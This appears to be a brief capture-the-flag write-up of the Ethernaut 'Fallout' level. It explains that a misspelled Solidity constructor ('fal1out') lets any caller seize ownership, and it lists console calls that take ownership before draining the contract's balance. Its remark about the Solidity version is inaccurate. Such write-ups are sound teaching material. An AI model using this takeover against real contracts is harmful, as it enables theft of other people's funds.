There is a fatal error here, that is the constructor's name is misspelled , of course ,
when the version of solidity is updated to 0.6.2,the function of constructor is used to replace the previous version.

If we wanna get the Owner's permissions, we just only call the fal1out and make the permission exchange.
After get the permission, we can call collectAllocations withdraw all the balance in this smart contract.

await contract.owner()
//check the owner at this time
await contract.fal1out()
//call this error func to change the permission
await contract.owner()
//check again the owner, you will see the permissions changed.
